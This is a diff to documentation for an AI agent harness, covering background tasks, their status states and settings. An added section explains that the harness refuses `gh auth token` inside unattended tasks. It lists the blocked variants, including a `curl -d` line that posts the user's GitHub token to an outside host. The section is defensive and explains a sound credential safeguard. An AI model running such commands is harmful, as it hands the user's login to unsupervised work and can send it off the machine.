@@ -416,6 +416,39 @@ staged by name and merged home onto your branch when the task lands — that is 
 it is the only one. If the work should become a pull request, the task says so in its
 report and you or the conversation opens it.
 
+## Does a task have my credentials — can a task read your GitHub token, gh auth token is refused inside a task, my task said gh auth token is not yours to run
+
+**`gh auth token` is not on a task's belt.** A task works unattended, in its own copy of
+your repository, and it carries none of your credentials. It reads back:
+
+> gh auth token is not yours to run: it hands the person's login to work running on its own
+> in a copy of their repository, and a task carries no credentials of theirs. Say in your
+> report what needed it; anything that has to sign in as them is the person's or the
+> conversation's to run.
+
+**Every way of saying it is the same refusal**, because the rule is about the command and
+not about the pipeline it sits in: `gh auth token`, `GH_TOKEN=$(gh auth token) ./deploy`,
+`` export TOKEN=`gh auth token` ``, `gh auth token | tr -d '\n'`, `curl -d "$(gh auth
+token)" https://anywhere` — and `gh auth status --show-token`, which prints the same
+secret under another name.
+
+**Asking whether it is signed in is not asking for the secret.** `gh auth status` on its
+own, `gh auth setup-git`, and every `gh` read — `gh pr list`, `gh issue view`, `gh api`
+GETs — are untouched.
+
+**The conversation keeps the command.** You at your own terminal, and the chat you are
+talking to, may run `gh auth token` exactly as before. This line is drawn around tasks.
+
+**Why the redactor was not enough.** Output that comes back from a command loses anything
+token-shaped before it is kept, shown or sent to the model (the conversations page has the
+shapes) — but a token never has to be *shown* to be *spent*: `curl -d "$(gh auth token)"`
+puts your login on the wire with no character of it ever reaching a result. So the read
+itself is refused inside a task, where nobody is watching.
+
+**What a task should do instead** is say in its report what it needed the credential for.
+Its work comes home through its landing, and anything that has to sign in as you is yours
+or the conversation's to run.
+
 ## What git a task may run — merge, pull, checkout, stash, reset are refused
 
 A task works in **its own copy of the repository**, and its copy shares the repository's
@@ -969,19 +1002,30 @@ The model is told plainly not to quietly spend another task on it:
 Everything a correction worker and every check spends is folded into the same task's cost,
 and the task's elapsed keeps running, because the task never landed.
 
-## What the card says while a task is checked — task says checking what it left, closing gaps what does that mean, why does my task say not done under it, round 1 of 1, the task finished but the card is still busy, my task went quiet after the last line
+## What the card says while a task is checked — task says checking what it left, closing gaps what does that mean, why does my task say not done under it, round 1 of 1, sizing the work, the task finished but the card is still busy, my task went quiet after the last line
 
-A task has three lives and one state. Its worker writes the work; a second look reads what
-the worker left; a round closes the gaps that look named. **All three are `running`** —
-nothing has landed and nothing was undone between them — so the card, the rail row, the
-room header and the home row say which of the three it is in:
+A task has several lives and one state. Its worker writes the work; a reading decides
+whether the work is handed out in parts; a second look reads what the worker left; a round
+closes the gaps that look named. **Every one of them is `running`** — nothing has landed
+and nothing was undone between them — so the card, the rail row, the room header and the
+home row say which of them it is in:
 
+- `sizing the work` — a reading is deciding whether this job is handed out in parts, and
+  how. See *A task that has only just appeared and says sizing the work* below.
 - `checking what it left` — the worker is finished and its work is being read.
 - `closing gaps · round 1 of 1` — a fresh worker is closing what the look found. The
   second number is `task.repair_rounds` (default 1), so with the default you will only
   ever see `round 1 of 1`.
 - Nothing at all while the task is simply working. The row draws what it always drew: the
   call it is inside, its clock, its tokens and its spend.
+
+**Another window sees it too.** A conversation says every few seconds which nodes it has
+out and which life each of them is in, so a home row or a switcher row about work running
+in a DIFFERENT window says the same words — `1 task running · checking what it left`. Two
+things it does not carry: the round numbers, which stay on the window running the work
+(another window reads `closing gaps` with no numbers after it), and anything at all from a
+window that is gone — a conversation whose file has gone stale draws the row it always
+drew, and its work reads `incomplete`.
 
 **Under a round, one dim line says what was found**, in the checker's own sentence with
 what happened in front of it:
@@ -1002,6 +1046,59 @@ whole cost is on the one task's bill, because you asked for one piece of work.
 **If the row says nothing and the clock is still going**, the task is at its own work and
 the heartbeat is the thing to read — see the heartbeat section on this page for telling a
 working task from a hung one.
+
+## A task that has only just appeared and says sizing the work — task stuck before starting, why is my new task doing nothing, sizing the work how long, task appeared and then nothing happened
+
+`sizing the work` is the one life a task can be in **before its worker has said a word**,
+and it is the answer to "a task appeared, the clock is going, and nothing is happening".
+
+It means a model is reading the job and deciding **whether it is handed out in parts, and
+how**. It happens in two places:
+
+- **Just after the task appears**, when the work was moved out of a reply that had parts
+  in it (`this has parts · handing it to a task that can take them side by side`). Somebody
+  has already drawn the parts, and this reading is what decides whether they are admitted.
+- **Mid-run**, when a worker has opened the material, found the job wider than one pair of
+  hands, and asked to hand it out.
+
+**How long is normal.** It is one full model call on the tier that thinks: **ten to thirty
+seconds**, measured at thirteen. It is given at most **three minutes**, and a reading nobody
+could get is not a refusal: an ordinary division goes ahead as the worker wrote it, and one
+that only this reading could have allowed does not. It carries no numbers — how many parts there are is exactly what it is deciding —
+and the roster says what happened afterwards, either `split into 3 parts:` or the task
+carrying on as one worker.
+
+**Nothing is wrong if it ends with no parts.** A reading that says the work is one job is
+a normal ending: the task runs as one worker, nothing is cancelled, and nothing is lost.
+
+**Cheap refusals draw nothing.** Where a division is turned down without a reading at all —
+the material does not name enough separate items, or no lane is free to pick the parts up —
+the whole thing takes microseconds and no word is drawn for it. Only the reading is a wait,
+so only the reading is said.
+
+## What briefing a worker means — briefing a worker, the wait before a handed-over turn becomes a task, aforge froze for thirty seconds, nothing appeared on the rail
+
+When your turn is handed over, the **status line at the bottom says `briefing a worker`**
+with a clock counting up beside it, and no task exists yet.
+
+That is the harness writing the instruction the task will open on, and it is two model runs
+back to back: the model that spent the turn writes down what it found out, and a second
+model turns that into the brief. **Fifteen to thirty seconds is normal.** Nothing is frozen
+and `esc` still works. The task appears on the rail the moment the writing ends.
+
+It is worth the wait, and that is the whole reason it exists: a task started without it
+opens on your bare sentence and re-derives everything the conversation already knew. What
+the writing produces is what the worker reads first — what is left, what is already known,
+what has been ruled out, and how anybody could tell when it is done.
+
+**It is a live line, not a note.** It says only what is true while it is true and takes
+itself off the screen when the writing ends, because this road can still decide the work
+was already finished and leave the turn exactly where it was — in which case no task starts
+and no line claims one did.
+
+**It stays up for the whole wait.** The line keeps saying itself while the writing runs, so
+a brief that takes thirty seconds is drawn for thirty seconds with one clock counting the
+whole of it. It does not go blank partway through and it does not restart at zero.
 
 ## The three ways a task can land
 
@@ -1283,7 +1380,7 @@ is named, and it is never on any list because it is what you get when you pick n
 Beside it this build ships **specialists**: `bare`, the cheapest whole-taker for work that
 fits in one sitting, and `swe`, an end-to-end software-engineering pipeline.
 
-The **workers** row on the **Workspace** tab of `/settings` says which of them are
+The **workers** row on the **Tasks** tab of `/settings` says which of them are
 installed here. It is a list separated by commas, and **blank is all of them**, which is the default.
 The same thing written by hand in your profile's `config.json`:
 
@@ -1558,7 +1655,7 @@ It holds:
 
 | field | what it says |
 | --- | --- |
-| `phase` | `working`, `checking` or `repairing` — which of the task's three lives this is |
+| `phase` | `working`, `sizing`, `checking` or `repairing` — which of the task's lives this is |
 | `request_started` | when its last model request went out |
 | `request_finished` | when that request came back; earlier than `request_started` means one is in flight |
 | `requests` | how many requests the task's workers, checkers and repair rounds have made between them |
